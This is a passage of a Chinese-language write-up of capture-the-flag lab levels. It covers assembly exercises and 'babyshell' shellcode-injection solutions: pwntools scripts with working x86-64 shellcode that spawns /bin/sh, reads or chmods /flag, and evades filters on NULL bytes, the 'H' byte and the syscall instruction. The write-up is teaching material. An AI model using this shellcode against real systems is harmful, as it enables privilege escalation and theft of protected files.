</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>xor</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rax</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rbx</span><span class=p>,</span> <span class=mi>0x403000</span>       <span class=c># foo()
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>cmp</span> <span class=no>rdi</span><span class=p>,</span> <span class=mi>0</span>              <span class=c># if src_addr != 0
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>je</span> <span class=no>.done</span>
</span></span><span class=line><span class=cl><span class=nl>.loop:</span>
</span></span><span class=line><span class=cl><span class=nf>cmp</span> <span class=no>BYTE</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rdi</span><span class=p>],</span> <span class=mi>0</span>   <span class=c># while [src_addr] != 0
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>je</span> <span class=no>.done</span>
</span></span><span class=line><span class=cl><span class=nf>cmp</span> <span class=no>BYTE</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rdi</span><span class=p>],</span> <span class=mi>90</span>  <span class=c># if [src_addr] &lt;= 90
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>jg</span> <span class=no>.fi</span>
</span></span><span class=line><span class=cl><span class=nf>push</span> <span class=no>rax</span>                <span class=c># save rax
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>push</span> <span class=no>rdi</span>                <span class=c># save rdi
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>mov</span> <span class=no>rdi</span><span class=p>,</span> <span class=p>[</span><span class=no>rdi</span><span class=p>]</span>          <span class=c># arg1 &lt;- [src_addr]
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>call</span> <span class=no>rbx</span>
</span></span><span class=line><span class=cl><span class=nf>pop</span> <span class=no>rdi</span>                 <span class=c># restore rdi
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>mov</span> <span class=p>[</span><span class=no>rdi</span><span class=p>],</span> <span class=no>rax</span>          <span class=c># [src_addr] &lt;- retval of foo()
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>pop</span> <span class=no>rax</span>                 <span class=c># restore rax
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>inc</span> <span class=no>rax</span>
</span></span><span class=line><span class=cl><span class=nl>.fi:</span>
</span></span><span class=line><span class=cl><span class=nf>inc</span> <span class=no>rdi</span>                 <span class=c># src_addr++
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>jmp</span> <span class=no>.loop</span>
</span></span><span class=line><span class=cl><span class=nl>.done:</span>
</span></span><span class=line><span class=cl><span class=nf>ret</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=23>23</h3><p>注意用 rsp 寻址代替 rbp 寻址：<code>[rbp-x] == [rsp+x]</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>push</span> <span class=no>rbp</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rbp</span><span class=p>,</span> <span class=no>rsp</span>
</span></span><span class=line><span class=cl><span class=nf>sub</span> <span class=no>rsp</span><span class=p>,</span> <span class=mi>0x100</span>              <span class=c># 0 - 0xff
</span></span></span><span class=line><span class=cl><span class=c></span>
</span></span><span class=line><span class=cl><span class=nf>xor</span> <span class=no>rbx</span><span class=p>,</span> <span class=no>rbx</span>
</span></span><span class=line><span class=cl><span class=nl>.loop:</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>cl</span><span class=p>,</span> <span class=no>BYTE</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rdi</span><span class=err>+</span><span class=no>rbx</span><span class=p>]</span>  <span class=c># curr_byte = [src_addr + i]
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>inc</span> <span class=no>BYTE</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rsp</span><span class=err>+</span><span class=no>rcx</span><span class=p>]</span>      <span class=c># [stack_base - curr_byte]++
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>inc</span> <span class=no>rbx</span>                     <span class=c># i++
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>cmp</span> <span class=no>rbx</span><span class=p>,</span> <span class=no>rsi</span>                <span class=c># for i &lt; size
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>jl</span> <span class=no>.loop</span>
</span></span><span class=line><span class=cl><span class=nf>xor</span> <span class=no>rbx</span><span class=p>,</span> <span class=no>rbx</span>                <span class=c># b = 0
</span></span></span><span class=line><span class=cl><span class=c></span>
</span></span><span class=line><span class=cl><span class=nf>xor</span> <span class=no>rcx</span><span class=p>,</span> <span class=no>rcx</span>                <span class=c># max_freq = 0
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>xor</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rax</span>                <span class=c># max_freq_byte = 0
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>.loop2</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=nf>cmp</span> <span class=no>BYTE</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rsp</span><span class=err>+</span><span class=no>rbx</span><span class=p>],</span> <span class=no>cl</span>  <span class=c># if [stack_base - b] &gt; max_freq
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>jle</span> <span class=no>.fi</span><span class=c>;
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>mov</span> <span class=no>cl</span><span class=p>,</span> <span class=no>BYTE</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rsp</span><span class=err>+</span><span class=no>rbx</span><span class=p>]</span>  <span class=c># max_freq = [stack_base - b]
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rbx</span>                <span class=c># max_freq_byte = b
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>.fi</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=nf>inc</span> <span class=no>rbx</span>                     <span class=c># b++
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>cmp</span> <span class=no>rbx</span><span class=p>,</span> <span class=mi>0xff</span>               <span class=c># for b &lt;= 0xff
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>jle</span> <span class=no>.loop2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rsp</span><span class=p>,</span> <span class=no>rbp</span>
</span></span><span class=line><span class=cl><span class=nf>pop</span> <span class=no>rbp</span>                     <span class=c># (mov rsp, rbp) + (pop rbp) = leave
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>ret</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=babyshell-shellcode-injection>babyshell: Shellcode Injection</h2><p>模版：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>binary</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>binary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>nop</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x90</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># TODO</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=1-2>1</h3><p>ORW 方法:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># read(0, address of rip, 1000)</span>
</span></span><span class=line><span class=cl><span class=n>sc1</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>xor rax, rax
</span></span></span><span class=line><span class=cl><span class=s2>xor rdi, rdi
</span></span></span><span class=line><span class=cl><span class=s2>lea rsi, [rip]
</span></span></span><span class=line><span class=cl><span class=s2>mov rdx, 1000  # &lt;- rip
</span></span></span><span class=line><span class=cl><span class=s2>syscall        # sc2 comes after syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># orw</span>
</span></span><span class=line><span class=cl><span class=n>sc2</span> <span class=o>=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>readfile</span><span class=p>(</span><span class=s2>&#34;/flag&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>sc1</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>nop</span><span class=o>*</span><span class=mi>16</span> <span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc2</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>拿 Shell 方法:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># execve(&#34;/bin/sh\x00&#34;,[&#34;/bin/sh\x00&#34;, &#34;-p\x00\x00&#34;],NULL)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov rax, 59                # execve
</span></span></span><span class=line><span class=cl><span class=s2>mov rbx, 0x68732f6e69622f  # &#34;/bin/sh&#34;
</span></span></span><span class=line><span class=cl><span class=s2>push rbx
</span></span></span><span class=line><span class=cl><span class=s2>mov rdi, rsp               # rdi -&gt; &#34;/bin/sh&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>push 0x702d                # &#34;-p&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov rcx, rsp               # rcx -&gt; &#34;-p&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>push 0
</span></span></span><span class=line><span class=cl><span class=s2>push rcx
</span></span></span><span class=line><span class=cl><span class=s2>push rdi
</span></span></span><span class=line><span class=cl><span class=s2>mov rsi, rsp               # rsi -&gt; [rdi, rcx, 0] on stack -&gt; [&#34;/bin/sh&#34;,&#34;-p&#34;,NULL]
</span></span></span><span class=line><span class=cl><span class=s2>mov rdx, 0                 # NULL
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=2-2>2</h3><p>nop sled，沿用上题的 <code>sc</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>nop</span><span class=o>*</span><span class=mh>0x800</span> <span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=3-2>3</h3><p>编码去掉 NULL byte，沿用上题的 <code>sc</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>encoder</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>),</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=4-2>4</h3><p>不能出现 <code>H</code> 字节，因此使用 32 位寄存器：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># read(0, address of rip, 1000)</span>
</span></span><span class=line><span class=cl><span class=n>sc1</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>xor eax, eax
</span></span></span><span class=line><span class=cl><span class=s2>xor edi, edi
</span></span></span><span class=line><span class=cl><span class=s2>lea esi, [rip]
</span></span></span><span class=line><span class=cl><span class=s2>mov edx, 1000  # &lt;- rip
</span></span></span><span class=line><span class=cl><span class=s2>syscall        # sc2 comes after syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># orw</span>
</span></span><span class=line><span class=cl><span class=n>sc2</span> <span class=o>=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>readfile</span><span class=p>(</span><span class=s2>&#34;/flag&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>sc1</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>nop</span><span class=o>*</span><span class=mi>16</span> <span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc2</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=5-2>5</h3><p>不能出现 syscall。syscall 是 <code>0f 05</code>，因此在最后加一句 <code>0e 05</code>，然后用 <code>inc BYTE PTR [rip]</code> 给最后一句加一变成 <code>syscall</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># read(0, address of rip, 1000)</span>
</span></span><span class=line><span class=cl><span class=n>sc1</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>xor rax, rax
</span></span></span><span class=line><span class=cl><span class=s2>xor rdi, rdi
</span></span></span><span class=line><span class=cl><span class=s2>lea rsi, [rip]
</span></span></span><span class=line><span class=cl><span class=s2>mov rdx, 1000  # &lt;- rip
</span></span></span><span class=line><span class=cl><span class=s2>inc BYTE PTR [rip] # rip on next line, which is 0e 05
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># orw</span>
</span></span><span class=line><span class=cl><span class=n>sc2</span> <span class=o>=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>readfile</span><span class=p>(</span><span class=s2>&#34;/flag&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>sc1</span><span class=p>)</span><span class=o>+</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x0e\x05</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>nop</span><span class=o>*</span><span class=mi>16</span> <span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc2</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=6-2>6</h3><p>不能出现 syscall，而且禁止在 shellcode 前 4096 字节区域内的写操作。我直接跳了前 4096 字节然后用 5 的方法，暂时没有想到其他方法。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># read(0, address of rip, 1000)</span>
</span></span><span class=line><span class=cl><span class=n>sc1</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>.rept 4096
</span></span></span><span class=line><span class=cl><span class=s2>nop
</span></span></span><span class=line><span class=cl><span class=s2>.endr
</span></span></span><span class=line><span class=cl><span class=s2>xor rax, rax
</span></span></span><span class=line><span class=cl><span class=s2>xor rdi, rdi
</span></span></span><span class=line><span class=cl><span class=s2>lea rsi, [rip]
</span></span></span><span class=line><span class=cl><span class=s2>mov rdx, 1000  # &lt;- rip
</span></span></span><span class=line><span class=cl><span class=s2>inc BYTE PTR [rip] # rip on next line, which is 0e 05
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># orw</span>
</span></span><span class=line><span class=cl><span class=n>sc2</span> <span class=o>=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>readfile</span><span class=p>(</span><span class=s2>&#34;/flag&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>sc1</span><span class=p>)</span><span class=o>+</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x0e\x05</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>nop</span><span class=o>*</span><span class=mi>16</span> <span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc2</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=7-2>7</h3><p>关闭了 stdin，因此不能用上文 ORW 方法中的 multi-stage 方式读 shellcode 了；关闭了 stdout 和 stderr，因此没有回显。这里用的方法是通过 <code>chmod</code> 系统调用修改 <code>/flag</code> 权限，最后 <code>cat /flag</code> 即可。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># chmod(&#34;/flag&#34;, 777)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov rax, 0x5a          # chmod
</span></span></span><span class=line><span class=cl><span class=s2>mov rbx, 0x67616c662f  # &#34;/flag&#34;
</span></span></span><span class=line><span class=cl><span class=s2>push rbx
</span></span></span><span class=line><span class=cl><span class=s2>mov rdi, rsp           # rdi -&gt; &#34;/flag&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>mov rsi, 0x1ff         # 777 -&gt; 111 111 111
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=8-2>8</h3><p>只能读 0x12 字节，因此要尽量缩短汇编代码的长度。由于 <code>/flag</code> 最终需要占 8 字节，需要 64 位寄存器存储，因此可以 <code>ln -s /flag a</code> 创建一个名为 <code>a</code> 的符号链接。权限方面也只需要 others 拥有读权限，因此设置为最小值 <code>4</code> 即可。最后根据情况缩减所使用的寄存器长度。</p><p>注意这里用 <code>mov bx, 0x61</code> 而不是 <code>bl</code>，是因为我们将 <code>bx</code> 推到栈上时有可能并没有遇到 0 字节，使得字符串 <code>a</code> 没能结尾。因此我们给 <code>bx</code> 赋值可以保证字符串以 0 字节结尾。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># chmod(&#34;a&#34;, 4)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov al, 0x5a  # chmod
</span></span></span><span class=line><span class=cl><span class=s2>mov bx, 0x61  # &#34;a&#34;
</span></span></span><span class=line><span class=cl><span class=s2>push rbx
</span></span></span><span class=line><span class=cl><span class=s2>mov rdi, rsp  # rdi -&gt; &#34;a&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>mov sil, 4    # 4 -&gt; 000 000 100
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=9-1>9</h3><p>每 10 字节会插入 10 字节的 0xcc，也就是 <code>int 3</code>，题目提示我们要阻止这些 <code>int 3</code> 被执行，因此计算好字节数并 <code>jmp</code> 掉即可。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># chmod(&#34;a&#34;, 4)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov al, 0x5a  # chmod
</span></span></span><span class=line><span class=cl><span class=s2>mov bx, 0x61  # &#34;a&#34;
</span></span></span><span class=line><span class=cl><span class=s2>push rbx
</span></span></span><span class=line><span class=cl><span class=s2>nop
</span></span></span><span class=line><span class=cl><span class=s2>jmp .L2
</span></span></span><span class=line><span class=cl><span class=s2>.rept 10
</span></span></span><span class=line><span class=cl><span class=s2>nop
</span></span></span><span class=line><span class=cl><span class=s2>.endr
</span></span></span><span class=line><span class=cl><span class=s2>.L2:
</span></span></span><span class=line><span class=cl><span class=s2>mov rdi, rsp  # rdi -&gt; &#34;a&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>mov sil, 4    # 4 -&gt; 000 000 100
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=10-12>10-12</h3><p>payload 和 8 相同，因为 8 的 payload 恰好可以满足这几题的条件。</p><h3 id=13-2>13</h3><p>只能读 0xc 字节，需要进一步压缩 8 的 payload。容易注意到 <code>mov bx, 0x61</code> 和 <code>push rbx</code> 可以合并为 <code>push 0x61</code>，恰好 12 字节。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># chmod(&#34;a&#34;, 4)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov al, 0x5a  # chmod
</span></span></span><span class=line><span class=cl><span class=s2>push 0x61     # &#34;a&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov rdi, rsp  # rdi -&gt; &#34;a&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>mov sil, 4    # 4 -&gt; 000 000 100
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>))</span>
